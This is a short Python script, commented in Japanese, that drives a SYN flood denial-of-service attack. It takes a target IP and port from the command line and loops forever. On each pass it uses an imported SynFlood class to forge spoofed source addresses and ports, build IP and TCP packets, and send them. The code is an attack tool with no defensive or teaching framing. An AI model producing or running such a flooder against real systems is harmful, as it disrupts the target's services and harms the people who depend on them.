import sys
# pychacheを作成しない
sys.dont_write_bytecode = True
from dos import syn_flood as sf
import argparse

class Main:
    # SYN Flood攻撃クラス
    #count = sys.argv[3]
    #num = 0
    while True:
        da = sf.SynFlood(sys.argv[1], sys.argv[2])
        da.createSrcIp()
        da.createSrcPort()
        da.createIpPacket()
        da.createTcpPacket()
        da.sendPacket()
        # num += 1
        